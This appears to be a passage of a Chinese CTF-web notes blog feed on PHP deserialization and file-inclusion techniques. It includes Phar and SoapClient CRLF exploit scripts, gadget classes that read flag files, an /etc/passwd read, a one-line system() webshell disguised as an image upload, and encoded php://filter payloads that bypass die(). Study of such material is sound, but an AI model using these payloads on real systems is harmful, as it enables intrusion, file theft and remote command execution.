href="#利用-fastdestruct-机制让-destruct-跑到前面去：" class="headerlink" title="利用 fastdestruct 机制让 destruct 跑到前面去："></a>利用 <code>fastdestruct</code> 机制让 <code>destruct</code> 跑到前面去：</h3><ul><li><strong>一般删最后的 <code>&#125;</code> 就行。</strong></li></ul><h1 id="字符-O-绕过"><a href="#字符-O-绕过" class="headerlink" title="字符 O 绕过"></a>字符 O 绕过</h1><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h3><ul><li><code>&lt;7.1.33</code></li></ul><h3 id="测试脚本："><a href="#测试脚本：" class="headerlink" title="测试脚本："></a>测试脚本：</h3><ul><li><a href="https://3v4l.org/YclXi">https://3v4l.org/YclXi</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/YclXi</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">D</span> </span>&#123;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span> </span>&#123;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;O:+1:&quot;C&quot;:0:&#123;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="字符-i、d-绕过"><a href="#字符-i、d-绕过" class="headerlink" title="字符 i、d 绕过"></a>字符 i、d 绕过</h1><h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a>条件：</h3><ul><li><code>&lt;8.0.3</code> （全版本）</li></ul><h3 id="测试脚本：-1"><a href="#测试脚本：-1" class="headerlink" title="测试脚本："></a>测试脚本：</h3><ul><li><a href="https://3v4l.org/SJm2g">https://3v4l.org/SJm2g</a><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//https://3v4l.org/SJm2g</span><br><span class="hljs-comment">// echo serialize(0);</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:-1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;i:+1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:-1.1;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-string">&#x27;d:+1.2;&#x27;</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="利用数组特性"><a href="#利用数组特性" class="headerlink" title="利用数组特性"></a>利用数组特性</h1><ul><li><p><strong>数组特性：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$arr</span> = [<span class="hljs-keyword">new</span> A, <span class="hljs-string">&#x27;a的方法&#x27;</span>];<br><span class="hljs-variable">$arr</span>(); <span class="hljs-comment">// 会直接调用 a 方法</span><br></code></pre></td></tr></table></figure></li><li><p><strong>反序列化利用：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>          <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;key)();     <span class="hljs-comment">//</span><br><br>在这里运用数组特性<br>          <span class="hljs-variable language_">$this</span>-&gt;mod2 =<span class="hljs-string">&quot;welcome&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;modl;<br>      &#125;<br>    <span class="hljs-variable">$arr</span> = [<span class="hljs-variable">$gf</span>, <span class="hljs-string">&#x27;get flag&#x27;</span>];<br>    <span class="hljs-variable">$f</span> = <span class="hljs-keyword">new</span> func;<br>    <span class="hljs-variable">$f</span>-&gt;key = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>);<br></code></pre></td></tr></table></figure></li></ul><h1 id="利用原生类"><a href="#利用原生类" class="headerlink" title="利用原生类"></a>利用原生类</h1><h3 id="查看-flag-文件名："><a href="#查看-flag-文件名：" class="headerlink" title="查看 flag 文件名："></a>查看 flag 文件名：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;DirectoryIterator&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;glob:///f*&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">c</span>(<span class="hljs-variable">$this</span>-&gt;f);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FLAG&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="读取文件："><a href="#读取文件：" class="headerlink" title="读取文件："></a>读取文件：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;SplFileObject&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;/flllaaaaggg&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">c</span>(<span class="hljs-variable">$this</span>-&gt;f);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;FLAG&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="GMP"><a href="#GMP" class="headerlink" title="GMP"></a>GMP</h1><h1 id="Phar-八股文"><a href="#Phar-八股文" class="headerlink" title="Phar 八股文"></a>Phar 八股文</h1><ul><li><strong>这段代码展示了如何生成一个 <code>.phar</code> 文件，并将任意 PHP 代码作为 stub。当这个 <code>.phar</code> 文件被解析或执行时，代码中的 stub 会被执行。</strong></li><li><strong>如果 WAF 过滤了 <code>phar://</code>，则可以使用：</strong><ul><li><code>compress.bzip2://phar://</code></li><li><code>compress.zlib://</code><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);  <span class="hljs-comment">//echo ($o) 变为八股文 </span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>,<span class="hljs-string">&quot;text&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>(); <span class="hljs-comment">//执行生成 phar.phar 文件</span><br>@<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;gzip phar.phar&quot;</span>);  <span class="hljs-comment">// 将 Phar 文件压缩为 gzip 格式</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;phar.phar.gz&quot;</span>));  <span class="hljs-comment">// 输出压缩后的 Phar 文件内容并进行 URL 编码，根据情况删掉后两行</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li></ul><h1 id="伪造为-GIF-的-Phar"><a href="#伪造为-GIF-的-Phar" class="headerlink" title="伪造为 GIF 的 Phar"></a>伪造为 GIF 的 Phar</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置 stub，增加 gif 文件头</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义 meta-data 存入 manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="然后就是利用，可以利用的函数："><a href="#然后就是利用，可以利用的函数：" class="headerlink" title="然后就是利用，可以利用的函数："></a>然后就是利用，可以利用的函数：</h3><ul><li><code>file_get_contents</code></li><li><code>fileatime</code></li><li><code>filectime</code></li><li><code>file_ctime</code></li><li><code>is_dir</code></li><li><code>is_file</code></li><li><code>is_executable</code></li><li><code>copy</code></li><li><code>unlink</code></li><li><code>stat</code></li><li><code>readfile</code></li></ul><h3 id="利用-file-get-contents-可以访问自己网站上的-Phar："><a href="#利用-file-get-contents-可以访问自己网站上的-Phar：" class="headerlink" title="利用 file_get_contents 可以访问自己网站上的 Phar："></a>利用 <code>file_get_contents</code> 可以访问自己网站上的 Phar：</h3><ul><li><code>cd /var/www/html</code></li><li><code>sudo chown www-data:www-data /var/www/html -R</code></li><li><code>sudo nano writefile.php</code></li></ul><h3 id="或者得到的数据直接上传到任意路径中，再用-phar-xxxxx-传到-file-get-content"><a href="#或者得到的数据直接上传到任意路径中，再用-phar-xxxxx-传到-file-get-content" class="headerlink" title="或者得到的数据直接上传到任意路径中，再用 phar://xxxxx 传到 file_get_content"></a>或者得到的数据直接上传到任意路径中，再用 <code>phar://xxxxx</code> 传到 <code>file_get_content</code></h3><h3 id="利用-data-在-PHP-终端制造："><a href="#利用-data-在-PHP-终端制造：" class="headerlink" title="利用 data:// 在 PHP 终端制造："></a>利用 <code>data://</code> 在 PHP 终端制造：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ph</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$ph</span>);<br></code></pre></td></tr></table></figure><ul><li><strong>让 <code>file_get_contents</code> 包含 <code>&#123;data://text/plain;base64（写入终端结果）&#125;</code> 到 <code>xxx.html</code>（后缀不重要），最后让 <code>file_get_contents</code> 包含 <code>phar://xxx.html</code>。</strong></li></ul><hr><h1 id="总结一下利用-PHP-反序列化逃逸的步骤"><a href="#总结一下利用-PHP-反序列化逃逸的步骤" class="headerlink" title="总结一下利用 PHP 反序列化逃逸的步骤"></a>总结一下利用 PHP 反序列化逃逸的步骤</h1><ol><li>确定利用目标</li><li>按照原程序正常序列化的步骤做一遍，看看正常序列化字符串的结构，基于此考虑攻击方式。注意，键值对设置的顺序会影响序列化结果，一定要按照程序内的方式设置值。</li><li>计算逃逸总共需要的字符，考虑需要构建多少被替换的字符。</li><li>插入 payload，结合本地运行结果查看 payload 是否成功</li></ol><h3 id="PHP-反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。"><a href="#PHP-反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。" class="headerlink" title="PHP 反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。"></a>PHP 反序列化逃逸的标志就是，在序列化完成后对序列化结果的字符串做替换。只要程序这么写，绝对有问题。</h3><hr><h1 id="CRLF-攻击"><a href="#CRLF-攻击" class="headerlink" title="CRLF 攻击"></a>CRLF 攻击</h1><h3 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h3><ul><li>源码需要进行反序列化</li><li>源码调用一个方法，且该方法不存在。以此激活 <code>__call()</code></li></ul><h3 id="利用范围（PHP-5-PHP-7）："><a href="#利用范围（PHP-5-PHP-7）：" class="headerlink" title="利用范围（PHP 5, PHP 7）："></a>利用范围（PHP 5, PHP 7）：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">VulnerableClass</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$userAgent</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$userAgent</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;userAgent = <span class="hljs-variable">$userAgent</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$arguments</span></span>) </span>&#123;<br>        <span class="hljs-comment">// 输出一条消息，模拟 __call 魔术方法被触发</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Method <span class="hljs-subst">$name</span> was called!&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getUserAgent</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;userAgent;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 模拟用户输入反序列化的操作</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">getUserAgent</span>();<br>    <span class="hljs-comment">// 调用一个不存在的方法，激活 __call 方法</span><br>    <span class="hljs-variable">$obj</span>-&gt;<span class="hljs-title function_ invoke__">nonExistentMethod</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;http://xxx.xxx.xxx.xxx:5555/&quot;</span>;<br><span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;data=abc&#x27;</span>;<br><span class="hljs-variable">$headers</span> = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,<br>    <span class="hljs-string">&#x27;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#x27;</span><br>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>. (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;hello&#x27;</span>));<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$aaa</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\n\r&quot;</span>,<span class="hljs-variable">$aaa</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aa</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$aaa</span>);<br><span class="hljs-variable">$aa</span>-&gt;<span class="hljs-title function_ invoke__">test</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-web</category>
      
      <category>php反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件操作篇</title>
    <link href="/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/"/>
    <url>/2024/09/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><ul><li><code>include()</code> 文件的内容将作为 PHP 代码执行，找不到被包含的文件时只会产生警告，脚本将继续运行。</li><li><code>include_once()</code> 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li><li><code>require()</code> 找不到被包含的文件时会产生致命错误，并停止脚本运行。</li><li><code>require_once()</code> 唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li><li>若文件内容符合 PHP 语法规范，包含时不管扩展名是什么都会被 PHP 解析。若文件内容不符合 PHP 语法规范则会暴露其源码。</li></ul><h1 id="路径问题"><a href="#路径问题" class="headerlink" title="路径问题"></a>路径问题</h1><ul><li><code>.</code>（单个点）：表示当前目录。例如，如果当前目录是 <code>/var/www/html</code>，那么 <code>./phpinfo.txt</code> 就表示 <code>/var/www/html/phpinfo.txt</code>。</li><li><code>..</code>（两个点）：表示上一级目录。例如，如果当前目录是 <code>/var/www/html</code>，那么 <code>../phpinfo.txt</code> 就表示 <code>/var/www/phpinfo.txt</code>。</li><li>如果是 PHP 文件 flag 最好用 base 读，txt 直接包含就行。</li></ul><h1 id="伪协议操作"><a href="#伪协议操作" class="headerlink" title="伪协议操作"></a>伪协议操作</h1><h3 id="file"><a href="#file" class="headerlink" title="file://"></a><code>file://</code></h3><ul><li>条件：<ul><li><code>allow_url_fopen</code>：不受影响</li><li><code>allow_url_include</code>：不受影响</li></ul></li><li>作用：用于访问本地文件系统。</li><li>说明：<ul><li><code>file://</code> 是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以 &#x2F;、\、\ 或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。</li><li>在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code> 会可选地搜索，也作为相对的路径。</li></ul></li><li>示例：<ul><li><code>http://127.0.0.1/?filename=file:///etc/passwd</code></li></ul></li></ul><h3 id="php"><a href="#php" class="headerlink" title="php://"></a><code>php://</code></h3><ul><li>条件：<ul><li><code>allow_url_fopen</code>：不受影响</li><li><code>allow_url_include</code>：仅 <code>php://input</code>、<code>php://stdin</code>、<code>php://memory</code>、<code>php://temp</code> 需要 <code>on</code>。</li></ul></li><li>作用：访问各个输入 &#x2F; 输出流（I&#x2F;O streams）</li><li>说明：<ul><li>PHP 提供了一些杂项输入 &#x2F; 输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</li><li><code>php://input</code> 可以访问请求的原始数据的只读流。如果启用了 <code>enable_post_data_reading</code> 选项，<code>php://input</code> 在使用 <code>enctype=&quot;multipart/form-data&quot;</code> 的 POST 请求中不可用。</li><li><code>php://output</code> 只写的数据流，允许你以 <code>print</code> 和 <code>echo</code> 一样的方式写入到输出缓冲区。</li><li><code>php://fd</code> (&gt;&#x3D;5.3.6) 允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</li><li><code>php://memory</code>、<code>php://temp</code> (&gt;&#x3D;5.1.0) 类似文件包装器的数据流，允许读写临时数据。两者的一个区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。<code>php://temp</code> 的内存限制可通过添加 <code>/maxmemory:NN</code> 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件。</li><li><code>php://filter/[read|write]=过滤器名称/resource=filename</code><ul><li><code>read</code> 操作：在读取数据时应用过滤器。</li><li><code>write</code> 操作：在写入数据时应用过滤器。</li><li>过滤器：<ul><li><code>string.rot13</code>：对数据进行 ROT13 变换。</li><li><code>string.toupper</code>：将字符串转换为大写。</li><li><code>string.tolower</code>：将字符串转换为小写。</li><li><code>convert.base64-encode</code>：将数据进行 Base64 编码。</li><li><code>convert.base64-decode</code>：将数据进行 Base64 解码。</li><li><code>convert.quoted-printable-encode</code>：将数据进行 Quoted-Printable 编码。</li><li><code>convert.quoted-printable-decode</code>：将数据进行 Quoted-Printable 解码。</li><li><code>convert.iconv.UTF-8/ISO-8859-1</code>：将数据从 UTF-8 编码转换为 ISO-8859-1 编码（iconv 需要安装）。</li><li><code>zlib.deflate</code>：对数据进行 DEFLATE 压缩。</li><li><code>zlib.inflate</code>：对数据进行 DEFLATE 解压缩。</li><li><code>zlib.encode</code>：对数据进行 gzip 编码。</li><li><code>zlib.decode</code>：对数据进行 gzip 解码。</li></ul></li></ul></li><li><code>resource=php://input</code>：读取请求的原始数据。</li><li><code>resource=php://stdin</code>：读取标准输入。</li><li><code>resource=php://stdout</code>：写入标准输出。</li><li><code>resource=php://stderr</code>：写入标准错误输出。</li></ul></li><li>示例：<ul><li><code>file_put_contents(a,b)</code> 将 b 的内容写入 a 中，正好触发了 write</li><li><code>file_get_contents()</code> 直接触发 read</li></ul></li></ul><h3 id="用-phar-协议"><a href="#用-phar-协议" class="headerlink" title="用 phar 协议"></a>用 phar 协议</h3><ul><li>创建一个一句话木马文件 <code>1.php</code>，内容为：<code>&lt;?php @system($_GET[0]);?&gt;</code>。然后压缩成 zip 文件，随后修改后缀名为 <code>.png</code> 或者 <code>.jpg</code>，上传该文件。</li><li>示例：<ul><li><code>?file=phar://upload/1.jpg/1&amp;0=cat%20/f1aaaag</code></li></ul></li></ul><h3 id="用-zip-协议"><a href="#用-zip-协议" class="headerlink" title="用 zip 协议"></a>用 zip 协议</h3><ul><li>压缩成 zip 文件，随后修改后缀名为 <code>.png</code> 或者 <code>.jpg</code>，上传该文件。</li><li>示例：<ul><li><code>?file=zip://upload/1.jpg%231&amp;0=cat /f1aaggggg</code></li></ul></li></ul><h3 id="绕过死亡-die"><a href="#绕过死亡-die" class="headerlink" title="绕过死亡 die"></a>绕过死亡 die</h3><ul><li><p>需要 URL 编码：</p><ul><li><code>GET: ?file=php://filter/write=convert.base64-decode/resource=1.php</code></li><li><code>?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</code></li></ul></li><li><p>需要 base64 编码，编码后最前面添加两个字母如：<code>aa</code>：</p><ul><li><code>POST: content=&lt;?php system(&#39;cat f*&#39;);</code></li><li><code>content=aaPD9waHAgcGhwaW5mbygpOz8+</code></li></ul></li><li><p>或：</p><ul><li>需要 URL 编码：<ul><li><code>GET: 